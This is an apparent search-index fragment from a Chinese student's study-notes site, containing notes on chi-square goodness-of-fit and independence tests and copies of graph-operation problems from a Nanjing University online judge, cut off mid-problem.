\u5728\u5b9e\u9645\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u5e38\u5e38\u4e0d\u77e5\u9053\u603b\u4f53\u7684\u5206\u5e03\u7c7b\u578b\uff08\u800c\u548c\u524d\u6587\u5df2\u77e5\u603b\u4f53\u670d\u4ece\u6b63\u6001\u5206\u5e03\u4e0d\u540c\uff09\uff0c\u8fd9\u5c31\u9700\u8981\u5bf9\u603b\u4f53\u7684\u5206\u5e03\u7c7b\u578b\u8fdb\u884c\u63a8\u65ad\uff0c\u8fd9\u79cd\u68c0\u9a8c\u79f0\u4e3a\u5206\u5e03\u62df\u5408\u4f18\u5ea6\u68c0\u9a8c\uff0c\u4e00\u822c\u5730\uff0c\u5047\u8bbe\u5982\u4e0b\uff1a\\(H_0:F(x)=F_0(x;\\theta)\\)\uff0c\u5176\u4e2d \\(F_0\\) \u4e3a\u67d0\u4e2a\u5df2\u77e5\u7684\u5206\u5e03\u51fd\u6570\uff0c\\(\\theta=(\\theta_1,\\cdots ,\\theta_r)^{\\mathsf{T}}\\) \u4e3a\u672a\u77e5\u53c2\u6570\u3002</p> <p>\u200b   \u4e0b\u9762\u6211\u4eec\u4ecb\u7ecd Pearson \\(\\chi^2\\) \u62df\u5408\u4f18\u5ea6\u68c0\u9a8c\uff0c\u57fa\u672c\u601d\u60f3\u662f\u5229\u7528\u4e8b\u4ef6\u9891\u7387\u548c\u6982\u7387\u4e4b\u95f4\u7684\u504f\u5dee\u6784\u9020\u68c0\u9a8c\u7edf\u8ba1\u91cf\u3002</p> <p>\u200b   \u5bf9\u4e8e\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\uff0c\u8bbe \\(H_0:P(X=x_i)=p_i,i=1,\\cdots,k\\)\uff0c\u5176\u4e2d \\(p_i\\) \u5747\u5df2\u77e5\uff0c\u4e14 \\(p_i\\ge0,\\sum_{i=1}^{n}p_i=1\\)\uff0c\\(X_1,\\cdots,X_n\\) \u662f\u4e00\u7ec4\u6837\u672c\uff0c\u4e0b\u9762\u662f\u68c0\u9a8c\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u8ba1\u7b97 \\((X_1,\\cdots,X_n)\\) \u4e2d\u53d6 \\(x_i\\) \u7684\u5b9e\u9645\u9891\u6570 \\(n_i,i=1,\\cdots,k\\)\uff0c\u5373\uff1a\\(n_i=\\sum_{i=1}^n[X_i=x_i]\\)</p> </li> <li> <p>\u8ba1\u7b97\u5b9e\u9645\u9891\u6570\u4e0e\u7406\u8bba\u9891\u6570\u7684\u504f\u5dee\u5e73\u65b9\u548c\uff1a\\(\\chi^2=\\sum_{i=1}^{k}\\dfrac{(n_i-np_i)^2}{np_i}\\)</p> </li> <li> <p>\u8be5\u7edf\u8ba1\u91cf\u79f0\u4e3a Pearson \\(\\chi^2\\) \u7edf\u8ba1\u91cf\uff0c\u5176\u5ea6\u91cf\u4e86\u5b9e\u9645\u6570\u636e\u4e0e\u7406\u8bba\u5206\u5e03\u7684\u62df\u5408\u7a0b\u5ea6\uff0c\\(\\chi^2\\) \u8d8a\u5927\uff0c\u62df\u5408\u7a0b\u5ea6\u8d8a\u5dee\uff0c\u53ef\u4ee5\u8bc1\u660e\uff0c\u5f53 \\(H_0\\) \u6210\u7acb\u65f6\uff0c\\(\\chi^2\\) \u7edf\u8ba1\u91cf\u7684\u6e10\u8fdb\u5206\u5e03\u4e3a \\(\\chi^2(k-1)\\).</p> </li> <li> <p>\u5728\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u62d2\u7edd\u57df\u4e3a\uff1a\\(W=\\{\\chi^2\\ge \\chi^2_\\alpha(k-1)\\}\\)</p> </li> </ol> <p>\u539f\u7406\u7c7b\u4f3c\uff0c\u6211\u4eec\u7ed9\u51fa\u4e00\u822c\u7684\u5047\u8bbe\u68c0\u9a8c\u95ee\u9898\uff1a</p> <ol> <li> <p>\u5c06\u6837\u672c\u7a7a\u95f4\u5206\u4e3a \\(k\\) \u4e2a\u4e92\u4e0d\u76f8\u4ea4\u7684\u4e8b\u4ef6 \\(A_1,\\cdots,A_k\\).</p> </li> <li> <p>\u8ba1\u7b97\u6837\u672c \\((X_1,\\cdots, X_n)\\) \u843d\u5728\u4e8b\u4ef6 \\(A_i\\) \u7684\u5b9e\u9645\u9891\u6570 \\(n_i,i=1,2,\\cdots,k\\).</p> </li> <li> <p>\u8ba1\u7b97\u6bcf\u4e2a\u4e8b\u4ef6 \\(A_i\\) \u4e0a\u7684\u7406\u8bba\u9891\u6570\uff1a\u82e5\u53c2\u6570 \\(\\theta\\) \u672a\u77e5\uff0c\u5219\u73b0\u7b97\u51fa \\(\\theta\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1 \\(\\hat{\\theta}\\)\uff0c\u7136\u540e\u8ba1\u7b97\u7406\u8bba\u9891\u6570 \\(n\\hat{p_i}\\)\uff0c\u5176\u4e2d \\(\\hat{p_i}=\\mathrm{Pr}(X\\in A_i|\\theta=\\hat{\\theta})\\).</p> </li> <li> <p>\u8ba1\u7b97\u5b9e\u9645\u9891\u6570\u4e0e\u7406\u8bba\u9891\u6570\u7684\u504f\u5dee\u5e73\u65b9\u548c\uff1a\\(\\chi^2=\\sum_{i=1}^{k}\\dfrac{(n_i-n\\hat{p_i})^2}{n\\hat{p_i}}\\)</p> </li> <li> <p>\u5728 \\(H_0\\) \u4e3a\u771f\u65f6\uff0cPearson-Fisher \u5b9a\u7406\u7ed9\u51fa\u7ed3\u8bba\uff1a\\(\\chi^2\\sim \\chi^2(k-r-1)\\).</p> </li> <li> <p>\u4e8e\u662f\u5728\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u62d2\u7edd\u57df\u5982\u4e0b\uff1a\\(W=\\{\\chi^2\\ge \\chi^2_\\alpha(k-r-1)\\}\\)</p> </li> </ol> <p>\u6b64\u5904 \\(r\\) \u4e3a\u72ec\u7acb\u672a\u77e5\u53c2\u6570\u7684\u6570\u91cf\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#_7","title":"\u72ec\u7acb\u6027\u68c0\u9a8c","text":"<p>\u8bbe \\((X_1,Y_1),\\cdots,(X_n,Y_n)\\) \u4e3a\u4e8c\u7ef4\u603b\u4f53 \\((X,Y)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\\(H_0: X\\,\u4e0e\\, Y\\, \u72ec\u7acb\\). \u6211\u4eec\u5c06 \\(X\\) \u4e0e \\(Y\\) \u7684\u53d6\u503c\u8303\u56f4\u5206\u6210 \\(r\\) \u4e2a\u4e0e \\(s\\) \u4e2a\u4e92\u4e0d\u76f8\u4ea4\u7684\u533a\u95f4 \\(A_1,\\cdots,A_r\\) \u548c \\(B_1,\\cdots,B_s\\)\uff0c\u7528 \\(n_{ij}\\) \u8868\u793a\u6307\u6807 \\(X\\) \u843d\u5728 \\(A_i\\)\uff0c\\(Y\\) \u843d\u5728 \\(B_j\\) \u7684\u6837\u672c\u70b9\u7684\u4e2a\u6570\uff0c\u53c8\u8bb0 \\(n_{i\\bullet}=\\sum_{j=1}^s n_{ij},n_{\\bullet j}=\\sum_{i=1}^{r}n_{ij}\\).\uff0c\u7531\u6b64\u7ed8\u5236\u4e00\u5f20 \\(r\\times s\\) \u5217\u8054\u8868\uff1a</p> <p></p> <p>\u8bb0 \\(p_{ij}=\\mathrm{Pr}(X\\in A_i,Y\\in B_k),p_{i\\bullet}=\\mathrm{Pr}(X\\in A_i),p_{\\bullet j}=\\mathrm{Pr}(Y\\in B_j)\\)\uff0c\u4ece\u800c\u96f6\u5047\u8bbe \\(H_0\\) \u7b49\u4ef7\u4e3a\u8fd9\u4e2a\u96f6\u5047\u8bbe\uff1a\\(H_0:p_{ij}=p_{i\\bullet} p_{\\bullet j}\\)\uff0c\u8be5\u5047\u8bbe\u4e2d\u542b\u6709 \\(r+s\\) \u4e2a\u672a\u77e5\u53c2\u6570\uff0c\u4f46\u56e0 \\(\\sum_{i=1}^{r}p_{i\\bullet}=\\sum_{j=1}^{s}p_{\\bullet j}=1\\)\uff0c\u6545\u800c\u4ec5\u6709 \\(r+s-2\\) \u4e2a\u72ec\u7acb\u7684\u672a\u77e5\u53c2\u6570\uff0c\u4e0b\u9762\u4f7f\u7528 \\(\\chi^2\\) \u68c0\u9a8c\u6cd5\uff1a</p> <p>\u5f53\u96f6\u5047\u8bbe\u6210\u7acb\u65f6\uff0c\u4f3c\u7136\u51fd\u6570\u4e3a\uff1a</p> \\[ L=\\prod_{i=1}^{r}\\prod_{j=1}^sp_{ij}^{n_{ij}}=\\left(\\prod_{i=1}^{r-1}p_{i\\bullet}^{n_{i\\bullet}}\\right)\\left(1-\\sum_{i=1}^{r-1}p_{i\\bullet}\\right)^{n_{r\\bullet}}\\left(\\prod_{j=1}^{s-1}p_{\\bullet j}^{n_{\\bullet j}}\\right)\\left(1-\\sum_{j=1}^{s-1}p_{\\bullet j}\\right)^{n_{\\bullet s}} \\] <p>\u5bf9\u6570\u4f3c\u7136\u4e3a\uff1a</p> \\[ \\ln L=\\sum_{i=1}^{r-1}n_{i\\bullet}\\ln p_{i\\bullet}+n_{r\\bullet}\\ln\\left(1-\\sum_{i=1}^{r-1}p_{i\\bullet}\\right)+\\sum_{j=1}^{s-1}n_{\\bullet j}\\ln p_{\\bullet j}+n_{\\bullet s}\\ln\\left(1-\\sum_{j=1}^{s-1}p_{\\bullet j}\\right) \\] <p>\u89e3\u4f3c\u7136\u65b9\u7a0b\u7ec4\uff1a</p> \\[ \\dfrac{\\partial \\ln L}{\\partial p_{i\\bullet}}=\\dfrac{n_{i\\bullet}}{p_{i\\bullet}}+\\dfrac{-n_{r\\bullet}}{1-\\sum_{i=1}^{r-1} p_{i\\bullet}}=0\\\\ \\dfrac{\\partial \\ln L}{\\partial p_{\\bullet j}}=\\dfrac{n_{\\bullet j}}{p_{\\bullet j}}+\\dfrac{-n_{\\bullet s}}{1-\\sum_{j=1}^{s-1} p_{\\bullet j}}=0 \\] <p>\u4ece\u800c\u5f97\u5230\uff1a</p> \\[ \\hat{p_{i\\bullet}}=\\dfrac{n_{i\\bullet }}{n},\\hat{p_{\\bullet j}}=\\dfrac{n_{\\bullet j}}{n};i=1,\\cdots,r-1; j=1,\\cdots,s-1 \\] <p>\u8ba1\u7b97 \\(\\chi^2\\)\uff1a</p> \\[ \\chi^2=\\sum_{i=1}^{r}\\sum_{j=1}^{s} \\dfrac{(n_{ij}-n\\hat{p_{i\\bullet}}\\hat{p_{\\bullet j}})^2}{n\\hat{p_{i\\bullet}}\\hat{p_{\\bullet j}}}=\\sum_{i=1}^{r}\\sum_{j=1}^{s} \\dfrac{(n_{ij}-n_{i\\bullet}n_{\\bullet j}/n)^2}{n_{i\\bullet}n_{\\bullet j}/n} \\] <p>\u539f\u5047\u8bbe\u6210\u7acb\u65f6\uff0c\u5176\u6e10\u8fdb\u5206\u5e03\u4e3a\u81ea\u7531\u5ea6 \\(rs-(r+s-2)-1=(r-1)(s-1)\\) \u7684 \\(\\chi^2\\) \u5206\u5e03\uff0c\u56e0\u6b64\u5728\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u4e3a \\(W=\\{\\chi^2\\ge \\chi^2_\\alpha((r-1)(s-1))\\}\\).</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/AAA_README/","title":"AAA README","text":"<p>\u6b64\u5904\u9898\u76ee\u4e3a\u5357\u4eac\u5927\u5b66 2024 \u7ea7\u95ee\u9898\u6c42\u89e3\uff08\u4e09\uff09\u5728\u7ebf\u8bc4\u6d4b\u7cfb\u7edf\uff08Online Judge\uff09\u9898\u76ee\u7684\u5907\u4efd\uff0c\u7248\u6743\u5c5e\u4e8e\u76f8\u5173\u51fa\u9898\u4eba\uff0c\u672c\u4eba\u4ec5\u4f5c\u642c\u8fd0\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/","title":"P10001","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#p1001-1","title":"P1001 \u56fe\u64cd\u4f5c -1","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#description","title":"Description","text":"<p>\u521d\u59cb\u7ed9\u51fa\u4e00\u4e2a\u7a7a\u7684\u56fe \\(G=(V,E)\\)\uff0c\u4f60\u7684\u4ee3\u7801\u9700\u8981\u652f\u6301\u5982\u4e0b\u64cd\u4f5c\u5e76\u8fd4\u56de\u53ef\u80fd\u7684\u7ed3\u679c\uff1a</p> <ol> <li>\u5c1d\u8bd5\u6dfb\u52a0\u9876\u70b9 \\(x\\)\uff08\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\uff09\uff0c\u6dfb\u52a0\u540e\u8f93\u51fa\u5f53\u524d\u9876\u70b9\u4e2a\u6570\u3002</li> <li>\u5c1d\u8bd5\u6dfb\u52a0\u65e0\u5411\u8fb9 \\(e=(u,v)\\)\uff0c\u82e5 \\(u\\notin V\\) \u6216 \\(v\\notin V\\)\uff0c\u5ffd\u7565\u672c\u6b21\u64cd\u4f5c\u3002</li> <li>\u67e5\u8be2\u9876\u70b9 \\(x\\) \u7684\u5ea6\uff0c\u4fdd\u8bc1 \\(x\\) \u5b58\u5728\u3002</li> <li>\u67e5\u8be2\u70b9\u96c6 \\(V_t\\) \u7684\u70b9\u5bfc\u51fa\u5b50\u56fe\u7684\u8fb9\u6570\uff0c\u4fdd\u8bc1 \\(V_t\\sub V\\).</li> <li>\u67e5\u8be2\u8fb9\u96c6 \\(E_t\\) \u7684\u8fb9\u5bfc\u51fa\u5b50\u56fe\u7684\u70b9\u6570\uff0c\u4fdd\u8bc1 \\(E_t\\sub E\\).</li> </ol> <p>\u6dfb\u52a0\u7684\u8fb9\u53ef\u80fd\u51fa\u73b0\u91cd\u8fb9\uff0c\u4f46\u4e0d\u4f1a\u6709\u81ea\u73af\uff0c\u5373 \\(u\\ne v\\)\u3002</p> <p>\u70b9\u5bfc\u51fa\u5b50\u56fe\uff1a\\(G\\) \u7684\u70b9\u5bfc\u51fa\u5b50\u56fe \\(G[V_t]\\) \u4e2d\uff0c\u5176\u9876\u70b9\u96c6\u4e3a \\(V_t\\)\uff0c\u8fb9\u96c6\u4e3a \\(G\\) \u7684\u8fb9\u96c6 \\(E\\) \u4e2d\u4e24\u4e2a\u9876\u70b9\u5747\u5c5e\u4e8e \\(V_t\\) \u7684\u8fb9\u7684\u96c6\u5408\u3002</p> <p>\u8fb9\u5bfc\u51fa\u5b50\u56fe\uff1a\\(G\\) \u7684\u8fb9\u5bfc\u51fa\u5b50\u56fe \\(G[E_t]\\) \u4e2d\uff0c\u5176\u8fb9\u96c6\u4e3a \\(E_t\\)\uff0c\u9876\u70b9\u96c6\u4e3a\u5728 \\(E_t\\) \u4e2d\u51fa\u73b0\u7684\u9876\u70b9\u7684\u96c6\u5408\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#format","title":"Format","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#input","title":"Input","text":"<p>\u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 \\(q\\)\uff0c\u8868\u793a\u64cd\u4f5c\u6b21\u6570\u3002</p> <p>\u63a5\u4e0b\u6765 \\(q\\) \u884c\uff0c\u6bcf\u884c\u7b2c\u4e00\u4e2a\u6574\u6570 \\(op\\) \u8868\u793a\u64cd\u4f5c\u7c7b\u578b\uff0c\u82e5\uff1a</p> <ul> <li>\\(op=1\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e00\u4e2a\u6574\u6570 \\(x\\)\uff0c\u8868\u793a\u5f53\u524d\u6dfb\u52a0\u7684\u9876\u70b9\u7f16\u53f7\u3002</li> <li>\\(op=2\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e24\u4e2a\u6574\u6570 \\(u,v\\)\uff0c\u8868\u793a\u6dfb\u52a0\u65e0\u5411\u8fb9 \\(e=(u,v)\\)\u3002</li> <li>\\(op=3\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e00\u4e2a\u6574\u6570 \\(x\\)\uff0c\u8868\u793a\u67e5\u8be2\u9876\u70b9 \\(x\\) \u7684\u5ea6\u3002</li> <li>\\(op=4\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e00\u4e2a\u6574\u6570 \\(s\\)\uff0c\u8868\u793a\u8f93\u5165\u70b9\u96c6\u7684\u5927\u5c0f\uff0c\u7136\u540e\u8f93\u5165 \\(s\\) \u4e2a\u6574\u6570 \\(v_i\\), \u8868\u793a\u70b9\u96c6\u7684\u5185\u5bb9\uff0c\u5176\u4e2d \\(v_i\\) \u8868\u793a\u9876\u70b9\u7f16\u53f7\u3002</li> <li>\\(op=5\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e00\u4e2a\u6574\u6570 \\(s\\)\uff0c\u8868\u793a\u8f93\u5165\u8fb9\u96c6\u7684\u5927\u5c0f\uff0c\u7136\u540e\u8f93\u5165 \\(s\\) \u4e2a\u6574\u6570 \\(e_i\\), \u8868\u793a\u8fb9\u96c6\u7684\u5185\u5bb9\uff0c\u5176\u4e2d \\(e_i\\) \u8868\u793a\u7b2c \\(e_i\\) \u6761\u6210\u529f\u6dfb\u52a0\u7684\u8fb9\u3002</li> </ul> <p>\u5bf9\u4e8e\u524d \\(30\\%\\) \u7684\u6570\u636e\uff0c\\(op\\in\\{1,2,3\\}\\).</p> <p>\u5bf9\u4e8e\u524d \\(50\\%\\) \u7684\u6570\u636e\uff0c\u4fdd\u8bc1\u6240\u6709\u8f93\u5165\u7684\u6570\u90fd\u662f \\(0\u223c500\\) \u7684\u6574\u6570\u3002</p> <p>\u5bf9\u4e8e \\(100\\%\\) \u7684\u6570\u636e\uff0c\u4fdd\u8bc1 \\(q\\le 10^5, op\\in\\{1,2,3,4,5\\},1\\le x,u,v\\le 10^5\\), \u64cd\u4f5c \\(4\\) \u548c \u64cd\u4f5c \\(5\\) \u5747\u4e0d\u8d85\u8fc7 \\(10\\) \u6b21\uff0c\u5355\u6b21\u8f93\u5165\u7684 \\(v_i\\) \u6216 \\(e_i\\) \u4e24\u4e24\u4e92\u4e0d\u76f8\u540c\u3002</p> <p>\u4fdd\u8bc1\u6240\u6709\u64cd\u4f5c\u6ee1\u8db3\u9898\u76ee\u63cf\u8ff0\uff0c\u4fdd\u8bc1\u6bcf\u4e00\u884c\u7684\u4e24\u4e2a\u76f8\u90bb\u6574\u6570\u90fd\u4ec5\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#output","title":"Output","text":"<p>\u5bf9\u4e8e\u6bcf\u4e2a \\(op=\\ne 2\\) \u7684\u8f93\u5165\uff0c\u90fd\u8f93\u51fa\u5355\u72ec\u7684\u4e00\u884c\u8868\u793a\u7ed3\u679c\u3002</p> <p>\u5bf9\u4e8e \\(op=1\\)\uff0c\u8f93\u51fa\u4e00\u4e2a\u6574\u6570\u8868\u793a\u5f53\u524d\u9876\u70b9\u4e2a\u6570\u3002</p> <p>\u5bf9\u4e8e \\(op=3\\)\uff0c\u8f93\u51fa\u4e00\u4e2a\u6574\u6570\u5206\u522b\u8868\u793a\u67e5\u8be2\u9876\u70b9\u7684\u5ea6\u3002</p> <p>\u5bf9\u4e8e \\(op=4\\)\uff0c\u8f93\u51fa\u4e00\u4e2a\u6574\u6570\u8868\u793a\u70b9\u5bfc\u51fa\u5b50\u56fe\u7684\u8fb9\u6570\u3002</p> <p>\u5bf9\u4e8e \\(op=5\\)\uff0c\u8f93\u51fa\u4e00\u4e2a\u6574\u6570\u8868\u793a\u8fb9\u5bfc\u51fa\u5b50\u56fe\u7684\u70b9\u6570\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#samples","title":"Samples","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#sample-input-1","title":"Sample Input 1","text":"<pre><code>20 \n1 17 \n1 9 \n1 5 \n1 14 \n2 5 17 \n2 14 9 \n2 17 14 \n2 14 17 \n2 9 5 \n5 3 2 1 5 \n4 3 5 9 17 \n3 14 \n5 1 3 \n4 3 14 9 17 \n4 1 5 \n2 1 9 \n5 2 3 5 \n4 3 5 9 14 \n5 2 5 4 \n5 2 1 5 \n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10001/#sample-output-1","title":"Sample Output 1","text":"<pre><code>1\n2\n3\n4\n4\n2\n3\n2\n3\n0\n4\n2\n4\n3\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/","title":"P10002","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#p1002-2","title":"P1002 \u56fe\u64cd\u4f5c -2","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#description","title":"Description","text":"<p>\u521d\u59cb\u7ed9\u51fa\u4e00\u4e2a\u4e24\u4e2a\u5404\u6709 \\(n\\) \u4e2a\u70b9 \\(0\\) \u6761\u8fb9\u7684\u65e0\u5411\u7b80\u5355\u56fe \\(G_1=(V_1,E_1)\\) \u548c \\(G_2=(V_2,E_2)\\)\uff0c\u8fd9 \\(n\\) \u4e2a\u70b9\u7f16\u53f7\u4e3a \\(1\u223cn\\)\uff0c\u4f60\u7684\u4ee3\u7801\u9700\u8981\u652f\u6301\u5982\u4e0b\u64cd\u4f5c\u5e76\u8fd4\u56de\u7ed3\u679c\uff1a</p> <ol> <li>\u6307\u5b9a\u67d0\u4e00\u4e2a\u65e0\u5411\u56fe\uff0c\u7ed9\u51fa\u4e00\u4e2a\u8fb9\u96c6\u5408 \\(E\\)\uff0c\u5bf9\u4e8e\u6bcf\u4e2a \\(e=(u,v)\\)\uff0c\u82e5\u5176\u5df2\u7ecf\u5728\u8fd9\u4e2a\u65e0\u5411\u56fe\u7684\u8fb9\u96c6\u4e2d\uff0c\u4f60\u9700\u8981\u5c06\u5176\u4ece\u65e0\u5411\u56fe\u4e2d\u5220\u53bb\uff0c\u5426\u5219\u5c06\u5176\u52a0\u5165\u65e0\u5411\u56fe\u8fb9\u96c6\u3002</li> <li>\u4ee4\u67d0\u4e00\u4e2a\u65e0\u5411\u56fe\u53d8\u4e3a\u81ea\u5df1\u7684\u8865\u56fe\uff0c\u5bf9\u4e8e\u65e0\u5411\u7b80\u5355\u56fe \\(G=(V,E)\\)\uff0c\u5b83\u7684\u8865\u56fe\u6307\u7684\u662f\u8fd9\u6837\u7684\u4e00\u5f20\u56fe\uff1a\u8bb0\u4f5c \\(\\overline{G}\\)\uff0c\u6ee1\u8db3 \\(V(\\overline{G})=V(G)\\)\uff0c\u4e14\u5bf9\u4efb\u610f\u8282\u70b9\u5bf9 \\((u,v)\\)\uff0c\\((u,v)\\in E\\) \u5f53\u4e14\u4ec5\u5f53 \\((u,v)\\notin E\\)\u3002</li> <li>\u8be2\u95ee \\(E_1\\) \u548c \\(E_2\\) \u7684\u5927\u5c0f\u3002</li> <li>\u8be2\u95ee\u4e24\u4e2a\u65e0\u5411\u56fe\u7684\u4ea4\uff08\u5373 \\(G_1\\cap G_2=(V_1\\cap V_2,E_1\\cap E_2)\\)\uff09\u7684\u8fb9\u96c6\u7684\u5927\u5c0f\u548c\u4e24\u4e2a\u65e0\u5411\u56fe\u5e76\uff08\\(G_1\\cup G_2=(V_1\\cup V_2,E_1\\cup E_2)\\)\uff09\u7684\u8fb9\u96c6\u7684\u5927\u5c0f\u3002</li> </ol> <p>\u65e0\u5411\u7b80\u5355\u56fe\uff1a\u6ca1\u6709\u81ea\u73af\u548c\u91cd\u8fb9\u7684\u65e0\u5411\u56fe\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#format","title":"Format","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#input","title":"Input","text":"<p>\u7b2c\u4e00\u884c\u4e24\u4e2a\u6574\u6570 \\(n,q\\)\uff0c\u5206\u522b\u8868\u793a\u8282\u70b9\u4e2a\u6570\u548c\u64cd\u4f5c\u6b21\u6570\u3002</p> <p>\u63a5\u4e0b\u6765 \\(q\\) \u884c\uff0c\u6bcf\u884c\u7b2c\u4e00\u4e2a\u6574\u6570 \\(op\\) \u8868\u793a\u64cd\u4f5c\u7c7b\u578b\uff0c\u82e5\uff1a</p> <ul> <li>\\(op=1\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(g,s\\)\uff0c\u8868\u793a\u5f53\u524d\u64cd\u4f5c\u7b2c \\(g\\) \u4e2a\u56fe\uff0c\u8f93\u5165\u8fb9\u96c6\u7684\u5927\u5c0f\u4e3a \\(s\\)\uff0c\u7136\u540e\u8f93\u5165 \\(2s\\) \u4e2a\u6574\u6570 \\(u_i,v_i\\)\uff0c\u8868\u793a\u8fb9\u96c6\u7684\u5185\u5bb9\uff0c\u5176\u4e2d \\(u_i,v_i\\) \u4e3a\u63d2\u5165\u8fb9\u7684\u4e24\u4e2a\u9876\u70b9\u3002</li> <li>\\(op=2\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570 \\(g\\)\uff0c\u8868\u793a\u4ee4 \\(G_g\\) \u53d8\u4e3a\u81ea\u5df1\u7684\u8865\u56fe\u3002</li> <li>\\(op=3\\)\uff0c\u8868\u793a\u8be2\u95ee \\(E_1\\) \u548c \\(E_2\\) \u7684\u5927\u5c0f\u3002</li> <li>\\(op=4\\)\uff0c\u8be2\u95ee\u4e24\u4e2a\u65e0\u5411\u56fe\u7684\u4ea4\u7684\u8fb9\u96c6\u7684\u5927\u5c0f\u548c\u4e24\u4e2a\u65e0\u5411\u56fe\u5e76\u7684\u8fb9\u96c6\u7684\u5927\u5c0f\u3002</li> </ul> <p>\u672c\u9898\u5171\u6709 \\(10\\) \u4e2a\u6d4b\u8bd5\u70b9\uff0c\u6bcf\u4e2a\u6d4b\u8bd5\u70b9 \\(10\\) \u5206\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9 \\(1,2\\)\uff0c\u6ee1\u8db3 \\(n,q\\le 500,op\\le 3\\).</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9 \\(3,4\\)\uff0c\u6ee1\u8db3 \\(n,q\\le 500\\).</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9 \\(5,6\\)\uff0c\u6ee1\u8db3 \\(n,q\\le 5000,op\\in\\{1,3,4\\}\\).</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9 \\(7,8\\)\uff0c\u6ee1\u8db3 \\(n,q\\le 5000\\).</p> <p>\u5bf9\u4e8e\u5168\u90e8\u6d4b\u8bd5\u70b9\uff0c\u4fdd\u8bc1 \\(n,q\\le 200000,op\\in \\{1,2,3,4\\},g\\in\\{1,2\\},u_i&lt;v_i\\le n,\\sum s\\le 5\\times 10^5\\)\u3002</p> <p>\u4fdd\u8bc1\u6240\u6709\u64cd\u4f5c\u6ee1\u8db3\u9898\u76ee\u63cf\u8ff0\uff0c\u4fdd\u8bc1\u6bcf\u4e00\u884c\u7684\u4e24\u4e2a\u76f8\u90bb\u6574\u6570\u90fd\u4ec5\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#output","title":"Output","text":"<p>\u5bf9\u4e8e\u6bcf\u884c \\(op=3\\) \u548c \\(op=4\\) \u7684\u8f93\u5165\uff0c\u90fd\u8f93\u51fa\u5355\u72ec\u7684\u4e00\u884c\u8868\u793a\u7ed3\u679c\uff0c\u540c\u4e00\u884c\u8f93\u51fa\u591a\u4e2a\u6570\u7684\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\uff0c\u6309\u7167\u8be2\u95ee\u987a\u5e8f\u7ed9\u51fa\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#samples","title":"Samples","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#sample-input-1","title":"Sample Input 1","text":"<pre><code>4 9\n1 1 3 1 2 1 3 1 4\n1 2 3 1 3 2 3 3 4\n3\n4\n2 1\n4 \n1 1 2 1 4 2 3\n3\n4\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10002/#sample-output-1","title":"Sample Output 1","text":"<pre><code>3 3\n1 5\n2 4\n3 3\n1 5\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/","title":"P10003","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#p1003","title":"P1003 \u5272\u70b9","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#description","title":"Description","text":"<p>\u7ed9\u51fa\u4e00\u4e2a \\(n\\) \u4e2a\u70b9\uff0c\\(m\\) 